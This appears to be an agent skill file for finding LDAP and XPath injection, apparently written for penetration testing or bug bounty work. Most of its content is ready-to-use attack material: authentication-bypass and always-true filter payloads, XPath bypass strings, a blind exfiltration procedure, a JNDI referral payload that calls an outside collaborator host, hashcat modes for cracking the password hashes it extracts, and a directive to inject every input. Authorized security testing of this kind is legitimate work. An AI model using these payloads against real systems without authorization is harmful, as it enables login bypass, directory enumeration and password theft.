---
name: hunt-ldap
description: LDAP / XPath injection hunting — AD vs generic LDAP distinction (unicodePwd write-only on AD, readable userPassword on OpenLDAP), filter injection prefix/Polish notation with parenthesis balancing, special-char escape set, DN vs search-filter injection, blind exfil with paired true/false oracles, XPath bypass payloads (no comment syntax), OOB JNDI referral injection. Use when people/address-book/org-chart search endpoints or SSO login pages exist. Trigger keywords: LDAP injection, XPath injection, filter injection, AD enumeration, referral injection.
---

# LDAP / XPath Injection — Deep Hunting

## THE GATE — AD vs Generic LDAP
`unicodePwd` is **write-only** — never claim AD hash exfil. Non-AD dirs (OpenLDAP/389-DS) expose readable `userPassword` `{SSHA}`/`{CRYPT}` hashes. Against AD the wins are `sAMAccountName`/`memberOf` enumeration and `description`/`info` fields where admins stash plaintext passwords.

## Filter Injection (prefix/Polish notation)
Mandatory parenthesis balancing — an unbalanced filter = syntax error = false positive, not bypass. Special-char test set: `* ( ) \ NUL` (RFC 4515 escapes `\2a \28 \29 \5c \00`). NUL truncates filters on C-backed servers: `admin)(uid=*))%00`.

## Search-Filter vs DN Injection (different bugs)
DN context cares about `, = + " \ < > ; /`, where `*` is NOT a wildcard.

## Blind Exfil Ladder
Paired true/false *oracle controls* (never raw byte-count) → char-by-char prefix probe against the TRUE class → repeat 3x + re-verify FALSE control per round (length-jitter is the #1 FP).

## XPath Bypasses (no comment syntax, keep quotes balanced)
`' or '1'='1`, `admin' or '1'='1' or 'a'='b`, blind node dump `x'] | //user/* | //user[name()='x`, node-name discovery `*[contains(name(),'pass')]`.

## OOB Gold Standard
JNDI/LDAP referral injection `(uid=*))(referral=ldap://<COLLAB>/x)` → Collaborator hit is decisive.

## Key Payloads
`*)(uid=*))(|(uid=*` (self-balancing always-true); `admin))(|(uid=*`; `admin)(!(userPassword=ZZZ))`; simple `admin*`.

## Detection
Errors `InvalidSearchFilterException`, `error code 49`, `NameNotFoundException`, `Bad search filter`, `ldap_search()`.

## Validation
Bypass must yield a *real authenticated session* AND the same payload minus one paren must throw filter-syntax error; negative control `)(uid=NONEXISTENT_ZZZ)` must fail. Hashcat: `{SSHA}`=111, `{SSHA256}`=1411, `{SSHA512}`=1711, `{CRYPT}` `$1$`=500, `$6$`=1800.

## Common Mistakes
Conflating AD with generic LDAP; claiming hash exfil on AD; unbalanced parens; absolute sizes instead of paired oracles; treating syntax errors as confirmation.

## PARAMETER COVERAGE — inject EVERY filter input (MANDATORY)
The #1 miss: testing only the username field on the login form and skipping
search boxes, autocomplete, address-book/people lookup, group/org lookups,
email-to-attribute lookups, and every other field that becomes part of an LDAP
search filter or DN.

1. **Enumerate** every input that plausibly feeds a directory lookup: login
   username, search `q`/`name`/`cn`/`email` params, filter fields, sort keys,
   `?attr=`/`?base=` params, headers passed to lookups.
2. **On EACH input run the injection ladder** (balanced parens mandatory):
   - special-char probe: `* ( ) \ NUL` and their RFC 4515 escapes
   - always-true: `*)(uid=*))(|(uid=*`, `*`, `admin*`
   - always-false negative control: `)(uid=NONEXISTENT_ZZZ)` (must fail)
   - DN-injection chars: `, = + " \ < > ; /`
   - blind exfil prefix probes against a paired true/false oracle (3x + FALSE
     re-verify per round)
3. **Auth-bypass shape**: `admin)(!(userPassword=ZZZ))` and simple `admin*`
   on the login/password fields; verify a REAL authenticated session is
   obtained, and that payload-minus-one-paren throws a filter error.
4. **OOB gold standard**: JNDI referral `(uid=*))(referral=ldap://<collab>/x)`
   on every injectable field.
5. **Re-sweep per endpoint class**: SSO login, directory search, user lookup,
   group membership check — each is a separate filter construction.
6. **Track** `endpoint → field → payload → result` in the journal; unlogged
   field = gap.